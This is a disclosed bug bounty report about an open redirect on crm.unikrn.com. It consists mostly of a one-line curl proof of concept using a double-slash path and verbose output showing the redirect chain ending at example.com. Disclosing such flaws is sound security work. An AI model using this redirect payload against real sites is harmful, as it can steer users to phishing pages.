# [crm.unikrn.com] Open Redirect

## Report Details
- **Report ID**: 297803
- **URL**: https://hackerone.com/reports/297803
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2017-12-14T09:10:37.726Z
- **Disclosed**: 2020-04-05T04:32:17.448Z

## Reporter
- **Username**: root0x0
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: unikrn

## Vulnerability Information
Hi 
   there is an open redirect vulnerable in crm.unikrn.com

POC

```curl http://crm.unikrn.com//example.com/ -L -v```

Response

```
< HTTP/1.1 302 Moved Temporarily
< Date: Thu, 14 Dec 2017 09:06:08 GMT
< Transfer-Encoding: chunked
< Connection: keep-alive
< Cache-Control: private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0
< Expires: Thu, 01 Jan 1970 00:00:01 GMT
< Location: https://crm.unikrn.com//example.com/
< Server: cloudflare-nginx
< CF-RAY: 3cd0016601fb853e-HKG
< 
* Ignoring the response-body
* Connection #0 to host crm.unikrn.com left intact
* Issue another request to this URL: 'https://crm.unikrn.com//example.com/'
*   Trying 104.20.9.41...
* TCP_NODELAY set
* Connected to crm.unikrn.com (104.20.9.41) port 443 (#1)
* TLS 1.2 connection using TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
* Server certificate: *.unikrn.com
* Server certificate: RapidSSL SHA256 CA - G2
* Server certificate: GeoTrust Primary Certification Authority - G3
> GET //example.com/ HTTP/1.1
> Host: crm.unikrn.com
> User-Agent: curl/7.54.0
> Accept: */*
> 
< HTTP/1.1 301 Moved Permanently
< Date: Thu, 14 Dec 2017 09:06:13 GMT
< Content-Type: text/html; charset=UTF-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< Set-Cookie: __cfduid=d42e68e619766e93f4ba615c19abf9eef1513242372; expires=Fri, 14-Dec-18 09:06:12 GMT; path=/; domain=.unikrn.com; HttpOnly
< X-Powered-By: PHP/7.0.24
< Set-Cookie: 839f76f7dca1d4c71482f5436e1aba22=3a92cdc4ad916ccb96391468d2ad7eda; path=/; HttpOnly
< Cache-Control: no-cache
< Location: //example.com
< Server: cloudflare-nginx
< CF-RAY: 3cd001795f3884a2-HKG
< 
* Ignoring the response-body
* Connection #1 to host crm.unikrn.com left intact
* Issue another request to this URL: 'https://example.com'
* Rebuilt URL to: https://example.com/
*   Trying 93.184.216.34...
* TCP_NODELAY set
* Connected to example.com (93.184.216.34) port 443 (#2)
* TLS 1.2 connection using TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
* Server certificate: www.example.org
* Server certificate: DigiCert SHA2 High Assurance Server CA
* Server certificate: DigiCert High Assurance EV Root CA
> GET / HTTP/1.1
> Host: example.com
> User-Agent: curl/7.54.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Accept-Ranges: bytes
< Cache-Control: max-age=604800
< Content-Type: text/html
< Date: Thu, 14 Dec 2017 09:06:13 GMT
< Etag: "359670651"
< Expires: Thu, 21 Dec 2017 09:06:13 GMT
< Last-Modified: Fri, 09 Aug 2013 23:54:35 GMT
< Server: ECS (rhv/818F)
< Vary: Accept-Encoding
< X-Cache: HIT
< Content-Length: 1270
```

## Impact

open Redirect vulnerable

## Attachments
No attachments
